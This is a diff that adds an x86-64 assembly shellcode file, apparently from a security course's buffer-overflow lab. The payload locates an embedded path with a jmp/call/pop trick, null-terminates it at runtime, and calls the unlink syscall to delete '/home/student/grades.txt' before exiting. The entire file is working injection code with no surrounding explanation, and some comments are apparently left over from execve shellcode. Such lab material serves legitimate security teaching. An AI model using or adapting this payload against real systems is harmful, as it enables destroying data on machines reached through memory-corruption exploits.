@@ -1,0 +1,34 @@
+#include <sys/syscall.h>
+
+#define STRING  "/home/student/grades.txt"
+#define STRLEN  24
+#define ARGV    (STRLEN+1)
+#define ENVP    (ARGV+8)
+
+.globl main
+  .type  main, @function
+
+main:
+  jmp   calladdr
+
+popladdr:
+  popq  %rcx
+  movq  %rcx, (ARGV)(%rcx)    /* set up argv pointer to pathname */
+  xorq  %rax, %rax            /* get a 64-bit zero value */
+  movb  %al, (STRLEN)(%rcx)   /* null-terminate our string */
+  movq  %rax, (ENVP)(%rcx)    /* set up null envp */
+
+  movb  $SYS_unlink, %al      /* set up the syscall number for unlink */
+  movq  %rcx, %rdi            /* syscall arg 1: string pathname */
+  xorq  %rsi, %rsi            /* syscall arg 2: NULL (no argv) */
+  xorq  %rdx, %rdx            /* syscall arg 3: NULL (no envp) */
+  syscall                     /* invoke syscall (unlink) */
+
+  xorq  %rax, %rax            /* get a 64-bit zero value */
+  movb  $SYS_exit, %al        /* set up the syscall number for exit */
+  xorq  %rdi, %rdi            /* syscall arg 1: 0 (exit status) */
+  syscall                     /* invoke syscall (exit) */
+
+calladdr:
+  call  popladdr
+  .ascii STRING
